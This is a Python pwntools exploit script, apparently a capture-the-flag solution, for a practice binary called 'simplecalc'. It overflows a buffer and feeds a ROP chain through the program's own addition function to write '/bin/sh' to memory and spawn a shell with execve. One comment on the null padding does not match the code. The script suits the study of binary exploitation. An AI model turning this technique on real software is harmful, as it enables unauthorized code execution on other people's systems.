import pwn
import struct

# simplecalc is a 64-bit statically linked binary
# NX is enabled, ASLR is turned on

# Because the target is statically linked we have a whole lot of ROP gadgets
# This exploit is a basic full rop chain, 
# The one big nuance here is that we have to have our desired values calculated for us by the binary

# The binary mallocs a buffer of a user-specified size between 3-0x100
# On exit, binary memcpy's that buffer into a buffer of size 40. This is an opportunity for a buffer overflow

target = pwn.process('./simplecalc')
target.recvuntil(b'calculations: ')
target.sendline(b'100')

# pop rax gadget:
# 0x000000000044db34
pop_rax = 0x44db34

# pop rdi gadget:
# 0x0000000000401b73
pop_rdi = 0x401b73	

# pop rsi gadget:
# 0x0000000000401c87
pop_rsi = 0x401c87

# pop rdx gadget:
# 0x0000000000437a85
pop_rdx = 0x437a85

# syscall gadget:
# 0x0000000000400488
syscall = 0x400488

# Putting /bin/sh somewhere in memory:
#0x000000000044526e: mov qword ptr [rax], rdx; ret;
mov_qword = 0x44526e
write_addr = 0x6c1000 # Writeable memory address (vmmap):


# Cause the target to compute our x using its addition function
def targetAddition(x):
	target.recvuntil(b'=> ')
	target.sendline(b'1')
	target.recvuntil(b'Integer x: ')
	target.sendline(b'100')
	target.recvuntil(b'Integer y: ')
	target.sendline(str(x - 100).encode())

# Send 8 byte values as two four byte integers 
def add(z):
	x = z & 0xffffffff
	y = ((z & 0xffffffff00000000) >> 32)
	targetAddition(x)
	targetAddition(y)


# Add 17 bytes of null to our payload (18 integers)
for i in range(9):
	add(0) # We use 0 so that the free() call we are accidentally overwriting doesn't crash


# Note: We dont need to swap the endianess of the contents of our rop chain because of the way we are inputting them into the binary
# essentially the binary is doing the swap for us 

### 1) Writing "/bin/sh" to memory ###

# Move target address into rax
add(pop_rax)
add(write_addr)

# Move "/bin/sh" into rdx
add(pop_rdx)
add(0x0068732f6e69622f) # /bin/sh Here we do actually need to swap the endianess ourselves

add(mov_qword) # Call the mov gadget

### 2) Making syscall ###

add(pop_rax)
add(0x3b)

add(pop_rdi)
add(write_addr) # Where we stored our pointer to bin/sh

add(pop_rsi)
add(0x0)

add(pop_rdx)
add(0x0)

add(syscall)


target.sendline(b'5') # Save and exit to execute memcpy and trigger overflow
target.interactive()








